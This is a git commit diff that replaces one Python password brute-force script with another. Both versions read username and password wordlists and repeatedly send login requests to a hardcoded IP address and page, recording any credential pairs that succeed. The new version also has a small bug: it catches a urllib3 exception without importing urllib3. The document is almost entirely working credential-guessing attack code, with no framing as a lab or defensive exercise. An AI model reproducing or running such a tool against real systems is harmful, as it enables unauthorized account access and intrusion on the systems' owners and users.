827fe0b30e76d9fc8301dfb8f4db5629ff4cc167
Jason Marks <jasonmarks@outlook.com.au>
2023-08-30 11:12:17 +1000

    Code changes
    Code Changes from Jason Marks

--- src/main.py
+++ src/main.py
@@ -1,165 +1,103 @@
-# Import required Python libraries
-import socket
+import requests
+from bs4 import BeautifulSoup
+import os
+from datetime import datetime
 import time
-import logging
-from urllib.parse import quote
+import http.client  # Import the http module
 
-# Configure the logging settings: appending to 'app.log', with specific log format and level
-logging.basicConfig(filename='app.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
+# Get the directory where the Python script is located
+script_directory = os.path.dirname(os.path.abspath(__file__))
 
-# Initialize a global request counter to 0. This counts the number of requests sent.
-request_counter = 0
+# URL of the page
+url = "http://54.206.178.157:8084/classified.html"
 
-# Check if string is null or whitespace
-def is_null_or_whitespace(s):
-    return s is None or s.strip() == ""
+# Path to the file containing usernames in the same directory as the script
+usernames_filename = "usernames.txt"
+usernames_file_path = os.path.join(script_directory, usernames_filename)
 
-# Define a function to read data from a text file and return it as a list.
-def read_data_from_file(filename):
-    try:
-        # Initialize an empty list to store lines from the file.
-        data_list = []
-        
-        # Open the file in read-only mode.
-        with open(filename, "r") as file:
-            # Loop through each line in the file.
-            for line in file:
-                # Remove leading and trailing white spaces, including newline characters.
-                line = line.strip()
-                
-                # Append the sanitized line to the list.
-                data_list.append(line)
-        
-        # Return the list populated with lines from the file.
-        return data_list
+# Path to the file containing passwords in the same directory as the script
+passwords_filename = "passwords.txt"
+passwords_file_path = os.path.join(script_directory, passwords_filename)
+
+# Define the subdirectory path for output files
+output_subdirectory = "Output"
+output_directory = os.path.join(script_directory, output_subdirectory)
+
+# Create a session
+session = requests.Session()
+
+# Send a GET request to the page to get cookies
+response = session.get(url)
+response.raise_for_status()  # Check for any errors
+
+# Parse the HTML content
+soup = BeautifulSoup(response.content, "html.parser")
+
+# Find the form
+login_form = soup.find("form")
+
+# Extract form action and other input fields
+action = login_form["action"]
+inputs = login_form.find_all("input")
+
+# Create the output subdirectory if it doesn't exist
+os.makedirs(output_directory, exist_ok=True)
+
+# Define the output filename
+current_time = datetime.now().strftime("%d%m%Y%H%M")
+output_filename = os.path.join(output_directory, f"{current_time}.txt")
+
+# Initialize attempt number
+attempt_number = 0
+
+# Limit total number of attempts
+max_attempts = 10000
+
+# Read usernames from the file
+with open(usernames_file_path, "r") as usernames_file:
+    usernames = usernames_file.read().splitlines()
+
+# Read passwords from the file
+with open(passwords_file_path, "r") as passwords_file:
+    passwords = passwords_file.read().splitlines()
+
+# Iterate through usernames and passwords to attempt to login
+for username in usernames:
+    if attempt_number >= max_attempts:
+        print(f"Reached maximum attempts ({max_attempts}). Stopping.")
+        break
     
-    except Exception as e:  # Catch any exceptions that may occur.
-        # Log the exception to the console.
-        print(f"An error occurred while reading the file: {e}")
+    for password in passwords:
+        # Increment attempt number
+        attempt_number += 1
         
-        # Return an empty list as no data could be read.
-        return []
+        # Prepare form data with credentials
+        form_data = {
+            input_.get("name"): input_.get("value", "")
+            for input_ in inputs
+        }
 
-# Define a function to send a POST request.
-def send_post_request(host, path, port, username, password):
-    global request_counter  # Declare the global variable for tracking the number of requests.
-    
-    try:
-        # Check if 10,000 requests have been made. If so, exit.
-        if request_counter >= 10000:
-           print("Reached the limit of 10,000 requests. Exiting.")
-           return False
+        form_data["username"] = username
+        form_data["password"] = password
+        
+        try:
+            # Send a POST request to login
+            login_response = session.post(url, data=form_data)
             
-        # Initialize a new socket object for IPv4 and TCP
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
-        # Set a 10-second timeout for the socket operations.
-        client.settimeout(60)
-        
-        # Connect the socket to the given host and port.
-        client.connect((host, port))
-        
-        # Create the request line for the HTTP POST request.
-        request_line = f"POST {quote(path)} HTTP/1.1\r\n"
-        
-        # Create the HTTP headers required for the POST request.
-        headers = f"Host: {host}\r\n"
-        headers += "Content-Type: application/x-www-form-urlencoded\r\n"
-        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
-        headers += f"Referer: http://{host}:{port}{path}\r\n"
-        headers += "Accept-Encoding: gzip, deflate\r\n"
-        headers += "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\n"
-        headers += "Cache-Control: max-age=0\r\n"
-        headers += "Upgrade-Insecure-Requests: 1\r\n"
-        headers += f"Origin: http://{host}:{port}\r\n"
-        headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\n"
-
-        
-        # Construct the payload with the username and password.
-        payload = f"username={quote(username)}&password={quote(password)}\r\n"
-        
-        # Calculate the content length for the HTTP header.
-        content_length = f"Content-Length: {len(payload)}\r\n\r\n"
-        
-        # Assemble the complete HTTP POST request.
-        request = request_line + headers + content_length + payload
-        
-        # Send the POST request over the socket.
-        print(request)
-        client.send(request.encode())
-        
-        # Initialize an empty list to collect the response chunks.
-        response_chunks = []
-        
-        # Loop to read the incoming response data in chunks.
-        while True:
-            chunk = client.recv(2048)  # Read up to 2048 bytes.
-            if chunk:  # If a chunk is received, append it to the list.
-                response_chunks.append(chunk)
-            else:  # If no more data, break the loop.
+            if login_response.status_code == 200:
+                print(f"Attempt {attempt_number}: Successfully logged in with username: {username} and password: {password} : Status Code: {login_response.status_code}")
+                
+                # Write the successful combination to the output file
+                with open(output_filename, "a") as output_file:
+                    output_file.write(f"Username: {username}, Password: {password}\n")
+                
+                # Break the loop if you want to stop after the first successful login
                 break
-                
-        # Close the socket connection.
-        client.close()
-        
-        # Concatenate and decode the response chunks into a single string.
-        response = b"".join(response_chunks).decode("utf-8")
-        
-        if (is_null_or_whitespace(response)):
-            print(f"\033[91mUNKNOWN - User: {username} - Password: {password}\033[0m")
-
-        else:
-            # Extract the first line of the HTTP response (status line).
-            status_line = response.split("\r\n")[0]
-            
-            # Extract the HTTP status code from the status line.
-            status_code = int(status_line.split(" ")[1]) 
-            
-            # Log success if the status code is not 401 (Unauthorized).
-            if status_code != 401:
-                logging.info(f"SUCCEED => User: {username} - Password: {password}")
             else:
-                print(f"\033[91m{status_line} - User: {username} - Password: {password}\033[0m\n\n")
-
-        # Increment the global request counter.
-        request_counter += 1
+                print(f"Attempt {attempt_number}: Login failed for username: {username} and password: {password} : Status Code: {login_response.status_code}")
         
-        # Return True to indicate successful execution.
-        return True
-    
-    # Handle cases where the socket operation times out.
-    except socket.timeout:
-        print("\033[91mSocket timed out\033[0m")
-        return True
-    
-    # Handle all other exceptions.
-    except Exception as e:
-        print(f"\033[91mAn error occurred: {e}\033[0m")
-        return True
-
-# Entry point of the script.
-if __name__ == '__main__':
-    # Read lines from the file into a list.
-    user_list = read_data_from_file("./data/users/top-users-shortlist.txt")
-    password_list = read_data_from_file("./data/passwords/2020-200-most-used-passwords.txt")
-    
-    # Check if data was successfully read.
-    if user_list and password_list:
-        print("Starting...\n")
+        except (requests.exceptions.ConnectionError, http.client.RemoteDisconnected, urllib3.exceptions.ProtocolError) as e:
+            print(f"Attempt {attempt_number}: Connection error occurred: {e}. Continuing...")
         
-        # Loop through each username in the list.
-        for username in user_list:
-            
-            # Loop through each password in the list.
-            for password in password_list:
-                
-                # Send POST request with each username-password pair.
-                if not send_post_request("54.206.178.157", "/classified.html", 8084, username, password):
-                    exit(0)
-
-                # Pause the execution for 1 second between requests.
-                time.sleep(1)
-                
-    else:
-        # Log an error message if no data could be read from the file.
-        print("\033[91mCould not read data from file. Exiting.\033[0m")
+        # Introduce a delay of 1 second between requests
+        time.sleep(1)
